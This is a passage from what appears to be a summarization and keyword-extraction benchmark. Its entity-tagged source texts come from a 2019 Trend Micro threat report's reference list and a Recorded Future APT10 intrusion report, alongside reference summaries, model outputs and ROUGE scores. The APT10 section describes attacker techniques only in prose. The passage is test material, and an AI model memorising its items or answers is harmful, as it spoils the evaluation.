Shreveport [ORG] Times . \u201c Update : Some of $ [MONEY] 1 M scammed from [ORG] Caddo schools has been found . \u201d Last accessedon 1 August 2019 at url [ORG] school/2514083002/.110 [ORG] Trend [ORG] Micro . ( [DATE] 10 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] London [ORG] Blue [ORG] Group [ORG] Using [ORG] Evolving [ORG] BEC [ORG] Techniques in Attacks . \u201d Last accessed on24 [DATE] July [DATE] 2019 at url techniques - in - their - attacks/.111 [ORG] Trend [ORG] Micro . ( [DATE] 16 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c New Business Email Compromise Scheme Reroutes Paycheck by [ORG] Direct [ORG] Deposit . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url compromise - scheme - reroutes - paycheck - by - direct - deposit/.112 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the Future : [WORK_OF_ART] Dealing [WORK_OF_ART] With [WORK_OF_ART] Pervasive [WORK_OF_ART] and [WORK_OF_ART] Persistent [WORK_OF_ART] Threats . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 2 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c BEC Scammers Steal US$ 1.75 [MONEY] Million From an [ORG] Ohio [ORG] Church . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] FBI [ORG] National [ORG] Press [ORG] Office . ( [DATE] 22 [DATE] April [DATE] 2019 ) . [ORG] FBI . \u201c [ORG] FBI Releases [ORG] the [ORG] Internet [ORG] Crime [ORG] Complaint [ORG] Center [ORG] 2018 [ORG] Internet [ORG] Crime [ORG] Report . \u201d Last accessed on [DATE] 13 [DATE] August [DATE] 2019 at url [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation [ORG] Internet [ORG] Crime [ORG] Complaint [ORG] Center . ( n.d . ) . [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation [ORG] Internet [ORG] Crime [ORG] Complaint [ORG] Center ( IC3).\u201c2018 [PERSON] Internet [PERSON] Crime [PERSON] Report . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the Future : [WORK_OF_ART] Dealing [WORK_OF_ART] With [WORK_OF_ART] Pervasive [WORK_OF_ART] and [WORK_OF_ART] Persistent [WORK_OF_ART] Threats . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 24 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] New [ORG] Sextortion [ORG] Scheme [ORG] Demands [ORG] Payment in Bitcoin Cash . \u201d Last accessed on [DATE] 24July [DATE] 2019 at url bitcoin - cash/.118 [PERSON] Vit [PERSON] Sembera . ( [DATE] 5 [DATE] January [DATE] 2018 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c When Speculation Is Risky : Understanding [PERSON] Meltdown and [GPE] Spectre . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url [ORG] Graz [ORG] University [ORG] of [ORG] Technology . ( [DATE] 2018 ) . [ORG] Graz [ORG] University [ORG] of [ORG] Technology . \u201c [PRODUCT] Meltdown and [PERSON] Spectre . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 aturl [ORG] Trend [ORG] Micro . ( [DATE] 14 [DATE] February [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Proof [WORK_OF_ART] of [WORK_OF_ART] Concept [WORK_OF_ART] Shows [WORK_OF_ART] How [WORK_OF_ART] Malware [WORK_OF_ART] Can [WORK_OF_ART] Hide [WORK_OF_ART] From [WORK_OF_ART] AV [WORK_OF_ART] Solutions via [ORG] Intel\u2019sSGX [ORG] Enclaves . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url concept - shows - how - malware - can - hide - from - av - solutions - via - intel - s - sgx - enclaves/.121 [ORG] Trend [ORG] Micro . ( [DATE] 15 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Side - Channel Attacks RIDL , Fallout , and ZombieLoad Affect Millions of Vulnerable IntelProcessors . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url attacks - ridl - fallout - and - zombieload - affects - millions - of - vulnerable - intel - processors/.122 [ORG] Trend [ORG] Micro . ( [DATE] 29 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [MONEY] Nearly [MONEY] 1 [MONEY] Million [MONEY] Systems [MONEY] Affected By \u2018 Wormable \u2019 BlueKeep Vulnerability ( CVE-2019 - 0708 ) . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url systems - affected - by - wormable - bluekeep - vulnerability - cve-2019 - 0708/.123 Simon Pope . ( [DATE] 14 [DATE] May [DATE] 2019 ) . [ORG] Microsoft [ORG] Security [ORG] Response [ORG] Center . \u201c Prevent a worm by updating [ORG] Remote [ORG] Desktop [ORG] Services ( CVE-2019 - 0708).\u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url cve-2019 - 0708/.43 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive Effects124 Trend Micro . ( [DATE] 31 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] SandboxEscaper [ORG] Releases [ORG] Exploit for Zero - Day [DATE] Vulnerability in Task Scheduler . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url for - zero - day - vulnerability - in - task - scheduler/.125 Trend Micro . ( [DATE] 28 [DATE] February [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c CVE-2019 - 5736 : RunC Container Escape Vulnerability Provides Root Access tothe Target Machine . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [DATE] 2019 - 5736 - runc - container - escape - vulnerability - provides - root - access - to - the - target - machine/.126 [ORG] Trend [ORG] Micro . ( [DATE] 4 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Previously [WORK_OF_ART] Patched , Still Potentially Critical : Kubernetes \u2019 Path Traversal Vulnerability . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url potentially - critical - kubernetes - path - traversal - vulnerability/.127 [PERSON] Ariel [PERSON] Zelivansky . ( [DATE] 28 [DATE] March [DATE] 2019 ) . Twistlock . \u201c Disclosing a directory traversal vulnerability in [ORG] Kubernetes copy \u2013 CVE-2019 - 1002101 . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url cve-2019 - [CARDINAL] 1002101/.128 [ORG] Trend [ORG] Micro . ( [DATE] 12 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c StackStorm DevOps Software Vulnerability CVE-2019 - 9580 Allows Remote CodeExecution . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url devops - software - vulnerability - cve-2019 - 9580 - allows - remote - code - execution/.129 [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] Network [ORG] and [ORG] Information [ORG] Security ( [ORG] NIS ) Directive . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 aturl [ORG] Keumars Afifi - Sabet . ( [DATE] 4 [DATE] April [DATE] 2019 ) . IT Pro . \u201c IT chiefs are compromising security for smoother business operations . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 25 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Security 101 : Virtual Patching . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [PERSON] John [PERSON] Simpson . ( [DATE] 29 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c CVE-2019 - 0725 : An Analysis of Its Exploitability . \u201d Last accessed on [DATE] 24July [DATE] 2019 at url [PERSON] John [PERSON] Simpson . ( [DATE] 24 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c CVE-2019 - 11815 : A Cautionary Tale About CVSS Scores . \u201d Last accessedon [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Gartner . ( [DATE] 7 [DATE] November [DATE] 2018 ) . [PERSON] Gartner . \u201c [WORK_OF_ART] Gartner [WORK_OF_ART] Identifies [WORK_OF_ART] Top [CARDINAL] 10 Strategic IoT Technologies and Trends . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the Future : [WORK_OF_ART] Dealing [WORK_OF_ART] With [WORK_OF_ART] Pervasive [WORK_OF_ART] and [WORK_OF_ART] Persistent [WORK_OF_ART] Threats . \u201d Last accessed on [CARDINAL] 24 July2019 at url [PERSON] Mark [PERSON] Vicente , [PERSON] Byron [PERSON] Galera , and [PERSON] Augusto [PERSON] Remillano . ( [DATE] 3 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [FAC] Bashlite [FAC] IoT [FAC] Malware Updated with Mining and [PERSON] Backdoor [PERSON] Commands , Targets WeMo Devices . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / bashlite - iot - malware - updated - with - mining - and - backdoor - commands - targets - wemo - devices/.137 [ORG] Trend [ORG] Micro . ( [DATE] 4 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Mirai [WORK_OF_ART] Variant [WORK_OF_ART] Spotted [WORK_OF_ART] Using [WORK_OF_ART] Multiple [WORK_OF_ART] Exploits , Targets Various Routers . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url various - routers/.138 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Jakub [PERSON] Urbanec . ( [DATE] 23 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New Mirai Variant Uses Multiple Exploits to [ORG] Target [ORG] Routers and Other Devices . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url variant - uses - multiple - exploits - to - target - routers - and - other - devices/.139 Ruchna Nigam . ( [DATE] 20 [DATE] July [DATE] 2018 ) . Unit [CARDINAL] 42 . \u201c Unit 42 Finds New Mirai and [PERSON] Gafgyt [PERSON] IoT / Linux Botnet Campaigns . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 aturl [PERSON] Augusto [PERSON] Remillano [PERSON] II . ( [DATE] 25 [DATE] January [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] ThinkPHP [WORK_OF_ART] Vulnerability [WORK_OF_ART] Abused by [PERSON] Botnets [PERSON] Hakai and [GPE] Yowai . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url and - yowai/.141 [PERSON] Augusto [PERSON] Remillano [PERSON] II . ( [DATE] 26 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c AESDDoS Botnet Malware Exploits CVE-2019 - 3396 to PerformRemote Code Execution , DDoS Attacks , and [ORG] Cryptocurrency [ORG] Mining . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url trendlabs - security - intelligence / aesddos - botnet - malware - exploits - cve-2019 - 3396 - to - perform - remote - code - execution - ddos - attacks - and- cryptocurrency - mining/.142 [ORG] Trend [ORG] Micro . ( [DATE] 31 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] HiddenWasp [ORG] Malware [ORG] Targets [ORG] Linux [ORG] Systems , [WORK_OF_ART] Borrows [WORK_OF_ART] Code from [ORG] Mirai , [ORG] Winnti . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url borrows - code - from - mirai - winnti/.143 [ORG] Trend [ORG] Micro . ( [DATE] 27 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PRODUCT] Silex [PRODUCT] Malware [PRODUCT] Bricks [PRODUCT] IoT [PRODUCT] Devices with Weak Passwords . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 5 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] Cybersecurity [ORG] Risks in [ORG] Complex [ORG] IoT [ORG] Environments : Threats to SmartHomes , Buildings and Other Structures . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url things / threats - and - risks - to - complex - iot - environments/.44 | 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] Effects145 [ORG] Trend [ORG] Micro . ( [DATE] 2 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] IoT [ORG] Devices in the Workplace : Security Risks and Threats to BYOD Environments . \u201d Lastaccessed on [DATE] 1 [DATE] August [DATE] 2019 at url risks - and - threats - to - byod - environments/.146 [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Industrial Internet of Things ( IIoT ) . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 aturl [PERSON] Ryan [PERSON] Flores , [PERSON] Stephen [PERSON] Hilt , and [PERSON] Akira [PERSON] Urano . ( [DATE] 6 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Cultivating [WORK_OF_ART] Security in [ORG] the [ORG] Food [ORG] Production [ORG] Industry : Nipping IoT Risks and Threats in the Bud . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url things / cultivating - security - in - the - food - production - industry/.148 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 3 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Security in [ORG] the [ORG] Era [ORG] of [ORG] Industry 4.0 : Dealing With Threats to SmartManufacturing Environments . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url security - in - the - era - of - industry-4 - dealing - with - threats - to - smart - manufacturing - environments.149 Trend Micro . ( [DATE] 4 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Securing [WORK_OF_ART] Enterprises [WORK_OF_ART] for [WORK_OF_ART] 5 G [WORK_OF_ART] Connectivity . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Trend [ORG] Micro . ( [DATE] 5 [DATE] April [DATE] 2018 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Exposed [WORK_OF_ART] Devices [WORK_OF_ART] and [WORK_OF_ART] Supply [WORK_OF_ART] Chain Attacks : [WORK_OF_ART] Overlooked [WORK_OF_ART] Risks in HealthcareNetworks . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url and - supply - chain - attacks - in - connected - hospitals.151 Trend Micro . ( [DATE] 27 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] The [WORK_OF_ART] IIoT [WORK_OF_ART] Attack Surface : [WORK_OF_ART] Threats [WORK_OF_ART] and [WORK_OF_ART] Security [WORK_OF_ART] Solutions . \u201d Last accessed on [CARDINAL] 24 July2019 at url [PERSON] Louis [PERSON] Columbus . ( [DATE] 6 [DATE] June [DATE] 2018 ) . Forbes . \u201c [WORK_OF_ART] 10 [WORK_OF_ART] Charts [WORK_OF_ART] That [WORK_OF_ART] Will [WORK_OF_ART] Challenge [WORK_OF_ART] Your [WORK_OF_ART] Perspective [WORK_OF_ART] Of [WORK_OF_ART] IoT \u2019s [WORK_OF_ART] Growth . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Ponemon [ORG] Institute . ( [DATE] March [DATE] 2019 ) . Tenable . \u201c [WORK_OF_ART] Cybersecurity [WORK_OF_ART] in [WORK_OF_ART] Operational [WORK_OF_ART] Technology : 7 Insights You Need to Know . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 22 [DATE] December [DATE] 2017 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c TRITON Wielding Its Trident \u2013 New Malware Tampering with [ORG] Industrial [ORG] Safety [ORG] Systems . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url new - malware - tampering - with - industrial - safety - systems/.155 [ORG] Trend [ORG] Micro . ( [DATE] 11 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] New [ORG] Critical [ORG] Infrastructure [ORG] Facility [ORG] Hit by Group Behind TRITON . \u201d Last accessed on [DATE] 1August [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 17 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [ORG] Xenotime , [ORG] Hacking [ORG] Group Behind Triton , [ORG] Found [ORG] Probing [ORG] Industrial [ORG] Control [ORG] Systems [ORG] of [ORG] Power [ORG] Grids in the [GPE] US . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url group - behind - triton - found - probing - industrial - control - systems - of - power - grids - in - the - us.157 [ORG] Trend [ORG] Micro . ( [DATE] 27 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] The [WORK_OF_ART] IIoT [WORK_OF_ART] Attack Surface : [WORK_OF_ART] Threats [WORK_OF_ART] and [WORK_OF_ART] Security [WORK_OF_ART] Solutions . \u201d Last accessed on [CARDINAL] 24 July2019 at url | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive Effects", "generated_text": "the first half of 2019; ransomware; threat actors; the first half of 2019; vulnerabilities; malware; phishing campaigns; trojanization; malicious code; data; phishing campaigns; malicious emails; the malware; malware; phishing campaigns; malware; the malware; servers; cloud-based environments; attacks; tactics; techniques; new ones; the threat landscape; intrusion; multilayered defense; the threat landscape; a challenge; cybersecurity; physical safety.", "ref_text": "<START-1>The midyear cybersecurity report examines the threat landscape in the first half of 2019, highlighting the prevalence of ransomware, the rise in threats that \"live off the land\", continued cryptocurrency mining, diversified messaging threats, impactful vulnerabilities, and risks in IoT/IIoT environments. Key points: - Ransomware remained widespread, with high-profile attacks on large enterprises and government organizations demanding high payouts. GandCrab announced retirement while Ryuk earned over $3.7 million. - Fileless threats increased 18% as attackers abused legitimate tools like PowerShell. Macro malware also persisted, mainly from Powload spam. Multistage and multilayered infections provided fail-safes. - Cryptocurrency mining was the top file-based threat detected, despite an overall decline. Threats shifted to target servers and cloud environments with exposed APIs and misconfigurations. - Messaging threats diversified, with Office 365 phishing increasing 76% and business email compromise scams rising 52%. Sextortion emails surged 319%. - Disclosure of hardware vulnerabilities like Meltdown/Spectre continued. Major software flaws like BlueKeep and a Windows zero-day were reported. - IoT botnets and worms battled for control of devices. Real-world IIoT malware like Triton targeted critical infrastructures. - The report highlights the need for multilayered defenses across networks, endpoints, servers, cloud, and mobile devices to address persistent and evasive threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4753623188405798, "gpt3/lexical/rouge_rouge2": 0.13411078717201166, "gpt3/lexical/rouge_rougeL": 0.24927536231884057, "gpt3/lexical/rouge_rougeLsum": 0.24927536231884057, "gpt3_generated_text": ["The article discusses the key cybersecurity threats and trends that emerged in the first half of 2019. Ransomware attacks remained widespread and evolved to target larger organizations, resulting in high-value losses. Threat actors increasingly used sophisticated techniques, such as \"living off the land\" and exploiting unpatched vulnerabilities, to infiltrate systems. Malware and phishing campaigns also became more diverse and relied on human vulnerability. Cryptocurrency mining threats targeted servers and cloud-based environments. Messaging platforms faced various threats, including business email compromise scams and phishing incidents. The threat landscape saw the use of multistage or multilayered infection chains and the persistence of attacks on routers and IoT devices. Vulnerabilities in both software and hardware posed significant risks. Proactive defense measures, including patching and multilayered defense strategies, were crucial in addressing the multifaceted threats. Ensuring cybersecurity and physical safety requires ongoing effort and vigilance."]}, {"split_name": "test", "sample_id": "test_90", "prompt_text": "Extract the keywords: [ORG] Recorded [ORG] Future analyzed an intrusion into one of our client \u2019s networks and collaborated with [PERSON] Rapid7 to determine the scope of a cyberespionage campaign assessed to be conducted by a [NORP] Chinese state - sponsored threat actor , APT10 . This report details the campaign using data acquired from targeted host networks , the [ORG] Recorded [ORG] Future \u00ae [PERSON] Platform , network metadata , [ORG] VirusTotal , Farsight [ORG] DNS , [GPE] Shodan , and other OSINT techniques . [NORP] Norwegian company [GPE] Visma , which was targeted in the attack , and [GPE] U.S. company [PERSON] Rapid7 provided support and extensive expertise throughout this research . Industry collaboration is a vital enabler in illuminating threats and offering protection to organizations at risk from hostile , state - sponsored economic cyberespionage . This report will be of most value to network defenders and corporate risk executives within companies that utilize services from managed IT service providers and cloud hosting providers . The report will also be of interest to companies with an exposed [ORDINAL] third - party supply chain . Executive SummaryA sustained cyberespionage campaign targeting [CARDINAL] at [CARDINAL] least [CARDINAL] three companies in [GPE] the [GPE] United [GPE] States and [LOC] Europe was uncovered by [ORG] Recorded [ORG] Future and [PERSON] Rapid7 between [DATE] November [DATE] 2017 and September 2018 . Based on the technical data uncovered , and in light of recent disclosures by [ORG] the [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice on the ongoing activities of [NORP] Chinese state - sponsored threat actors , we assess with high confidence that these incidents were conducted by APT10 ( also known as [PERSON] Stone [PERSON] Panda , menuPass , CVNX ) in an effort to gain access to networks and steal valuable intellectual property or gain commercial advantage . The targeted companies included:\u2022 IT and business cloud services managed service provider ( [ORG] MSP ) and [ORG] Recorded [ORG] Future client and supplier , [GPE] Visma , a [MONEY] billion [MONEY] - dollar [NORP] Norwegian company with [CARDINAL] at [CARDINAL] least [CARDINAL] 850,000 customers [ORG] globally\u2022 An international apparel company\u2022 A [GPE] U.S. law firm with strong experience in intellectual property law with clients in the pharmaceutical , technology , electronics , biomedical , and automotive sectors , among othersIn all [CARDINAL] three incidents , the attackers gained access to networks through deployments of [PRODUCT] Citrix and [PRODUCT] LogMeIn remote - access software using stolen valid user credentials . The attackers then enumerated access and conducted privilege escalation on the victim networks , [ORG] Recorded [ORG] Future | www.recordedfuture.com | CTA-2019 - 0206 | 1utilizing [ORG] DLL sideloading techniques documented in a [GPE] US - CERT alert on APT10 to deliver malware . During the [GPE] Visma intrusion , APT10 deployed their [PRODUCT] Trochilus malware with command and control ( C2 ) communications encrypted using both RC4 and Salsa20 streaming ciphers rather than the typically observed RC4 variant . On the [CARDINAL] two other victim networks , the attackers deployed a unique version of the [ORG] UPPERCUT ( ANEL ) backdoor , known to have only been used by APT10.APT10 actors then compressed proprietary data from [GPE] Visma using WinRAR ( deployed by the attackers ) and exfiltrated to a [ORG] Dropbox account using the cURL for Windows command - line tool . The same Dropbox account was also accessed in a similar fashion by the attackers during the apparel company intrusion . Dropbox was also used to store exfiltrated documents from the [ORDINAL] third victim , a [GPE] U.S. law firm , with the files again exfiltrated using identical TTPs and uploaded using cURL for Windows . We believe APT10 is the most significant [NORP] Chinese state - sponsored cyber threat to global corporations known to date . On top of the breadth , volume , and targets of attacks that APT10 has conducted since [DATE] at [DATE] least [DATE] 2016 , we now know that these operations are being run by the [NORP] Chinese intelligence agency , [ORG] the [ORG] Ministry [ORG] of [ORG] State [ORG] Security ( MSS).Utilizing actors working for shell companies such as [ORG] Huaying [ORG] Haitai [ORG] Science [ORG] and [ORG] Technology [ORG] Development [ORG] Co [ORG] Ltd ( ) , and under the direct supervision of their regional bureau in [GPE] Tianjin , the [ORG] MSS has conducted an unprecedented campaign , dubbed \u201c [WORK_OF_ART] Operation [WORK_OF_ART] Cloud [WORK_OF_ART] Hopper , \u201d against managed IT service providers ( MSPs ) designed to steal intellectual property and enable secondary attacks against their clients . Access to the networks of these [ORDINAL] third - party service providers grants the [ORG] MSS the ability to potentially access the networks of [CARDINAL] hundreds , if not [CARDINAL] thousands , of corporations around the world . We assess that APT10 likely compromised [GPE] Visma with the primary goal of enabling secondary intrusions onto their client networks , and not of stealing [GPE] Visma intellectual property . In this same time frame , APT10 also targeted a [GPE] U.S. law firm and an international apparel company , likely to gather information for commercial advantage . In all [CARDINAL] three incidents , APT10 actors usedRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 2previously acquired legitimate credentials , possibly gained via a [ORDINAL] third - party supply chain compromise in order to gain initial access to the law firm and the apparel company . [ORG] Recorded [ORG] Future timeline of APT10 activity between [DATE] August [DATE] 2018 and [DATE] January [DATE] 2019.Key Judgments\u2022 We have identified a new variant of [GPE] Trochilus malware , withits [CARDINAL] C2 communications encrypted using a combination of RC4 and Salsa20 stream ciphers.\u2022 An [ORG] UPPERCUT backdoor was identified in the targeting of an international apparel company and [GPE] U.S. law firm . The backdoor was deployed using the Notepad++ updater and sideloading malicious [ORG] DLL , as noted in APT10 \u2019s targeting of [NORP] Japanese corporations in [DATE] July [DATE] 2018.\u2022 In addition to using [PRODUCT] Trochilus and [ORG] UPPERCUT , APT10 utilized a series of previously known and associated attack TTPs for all [CARDINAL] three of these intrusions . Some of these TTPs include:\u2022 Transferring tools from the C2 to the host usingBITSAdmin - scheduled tasks into C:\\ProgramData\\tempRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | [CARDINAL] 3\u2022 Use of [ORG] DLL sideloading by executing a legitimatebinary to load a renamed malicious [ORG] DLL that decrypts , decompresses , and injects a [NORP] Trochilus payload into memory\u2022 Use of legitimate credentials , possibly acquired through previous [ORG] MSP compromises , to log in to accessible [ORG] Citrix [ORG] Remote [ORG] Desktop clients in targeted organizationsRecorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 4Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 37BackgroundAPT10 is a threat actor that has been active since [DATE] at [DATE] least [DATE] 2009 . It has historically targeted healthcare , defense , aerospace , government , heavy industry and mining , and MSPs and IT services , as well as other sectors , for probable intellectual property theft . In [DATE] early [DATE] 2017 , APT10 began conducting attacks against global managed IT service providers ( MSPs ) that granted them unprecedented access to MSPs and their customers \u2019 networks . During this operation ( dubbed \u201c \u2018 [WORK_OF_ART] Cloud [WORK_OF_ART] Hopper \u201d because of the group \u2019s use of popular western cloud - based services ) , APT10 utilized both new malware ( Quasar RAT , [GPE] Trochilus , [ORG] RedLeaves , [PERSON] ChChes ) as well as some familiar old tools ( Poison Ivy , PlugX).Most recently , on [DATE] December 20 , [DATE] 2018 , [ORG] the [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice charged [CARDINAL] two hackers associated with [ORG] the [ORG] Chinese [ORG] Ministry [ORG] of [ORG] State [ORG] Security ( [ORG] MSS ) with global computer intrusion campaigns targeting intellectual property . This indictment attributed the intrusions to APT10 , a group that had been conducting the malicious activities for [DATE] over [DATE] a [DATE] decade on behalf of the [ORG] MSS , [GPE] China \u2019s civilian human intelligence agency . Some of the material included within the indictment corroborated information detailed in the Intrusion Truth blog that provided strong evidence attributing APT10 to [ORG] the [ORG] Tianjin [ORG] State [ORG] Security [ORG] Bureau , a provincial bureau of [ORG] the [ORG] Ministry [ORG] of [ORG] State [ORG] Security . In the blog , [ORG] Intrusion [ORG] Truth identified APT10 as having utilized several [GPE] Tianjin - based companies , including [ORG] Huaying [ORG] Haitai [ORG] Science [ORG] and [ORG] Technology [ORG] Development [ORG] Co. [ORG] Ltd. and [ORG] Laoying [ORG] Baichen [ORG] Instruments [ORG] Equipment [ORG] Co. [ORG] Ltd. Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 5U.S. [ORG] Department [ORG] of [ORG] Justice indictment of APT10 threat actors . ( Source : www.justice.gov)The use of suspected shell companies as a front for [ORG] MSS - enabled cyber activity is n\u2019t a new observation , however . Our research from [DATE] 2017 concluded that [GPE] Guangdong ITSEC ( and therefore the [ORG] MSS ) directed the activities of a company named [ORG] Boyusec , which was identified as a shell company for APT3.Suspected [ORG] Tianjin [ORG] State [ORG] Security [ORG] Bureau headquarters . ( Source : IntrusionTruth)Recorded Future | www.recordedfuture.com | CTA-2019 - 0206 | 6The [DATE] December APT10 indictment noted that the group \u2019s malicious activities breached [CARDINAL] at [CARDINAL] least [CARDINAL] 45 companies and managed service providers in [CARDINAL] 12 countries , including [GPE] Brazil , [GPE] Canada , [GPE] Finland , [GPE] France , [GPE] Germany , [GPE] India , [GPE] Japan , [GPE] Sweden , [GPE] Switzerland , [GPE] the [GPE] United [GPE] Arab [GPE] Emirates , [GPE] the [GPE] United [GPE] Kingdom , and 